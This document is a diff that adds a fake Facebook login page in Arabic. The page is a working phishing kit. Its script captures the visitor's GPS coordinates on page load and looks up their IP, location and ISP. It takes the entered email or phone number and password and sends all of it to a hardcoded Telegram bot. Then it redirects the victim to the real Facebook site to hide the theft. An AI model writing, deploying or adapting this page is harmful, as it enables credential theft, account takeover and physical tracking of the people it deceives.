@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+        .left-side {
+            width: 500px;
+            padding-right: 20px;
+        }
+        .left-side h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .left-side p {
+            font-size: 28px;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .right-side {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 396px;
+            text-align: center;
+        }
+        .right-side input {
+            width: 92%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .right-side button {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .right-side button:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left-side">
+            <h1>facebook</h1>
+            <p>فيس بوك يتيح لك التواصل المشاركة مع الأصدقاء والعالم.</p>
+        </div>
+        <div class="right-side">
+            <form id="loginForm" onsubmit="handleSubmission(event)">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="pass" placeholder="كلمة السر" required>
+                <button type="submit" id="subBtn">تسجيل الدخول</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
+        const CHAT_ID = '7184970355';
+
+        let capturedGpsData = "Pending / Not Granted Yet";
+
+        // طلب إذن الـ GPS فور دخول الصفحة مباشرة
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        capturedGpsData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`;
+                        sendToTelegram(`[+] GPS Auto-Captured on Load:\n- Coordinates: ${capturedGpsData}`);
+                    },
+                    function(error) {
+                        capturedGpsData = `Denied/Error: ${error.message}`;
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            }
+        };
+
+        async function sendToTelegram(textMessage) {
+            let ipInfo = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipInfo = await res.json();
+            } catch (e) {
+                ipInfo = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', org: 'Unknown' };
+            }
+
+            const fullPayload = `
+${textMessage}
+- IP: ${ipInfo.ip}
+- Country: ${ipInfo.country_name} | City: ${ipInfo.city}
+- ISP: ${ipInfo.org}
+- Platform: ${navigator.platform}
+- User-Agent: ${navigator.userAgent}
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: fullPayload })
+            });
+        }
+
+        async function handleSubmission(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            const credsPayload = `
+[+] Phishing Credentials Captured:
+- Email/Phone: ${email}
+- Password: ${pass}
+- GPS State: ${capturedGpsData}
+            `.trim();
+
+            await sendToTelegram(credsPayload);
+
+            // إعادة توجيه الضحية لصفحة فيسبوك الحقيقية
+            window.location.href = 'https://www.facebook.com';
+        }
+    </script>
+</body>
+</html>
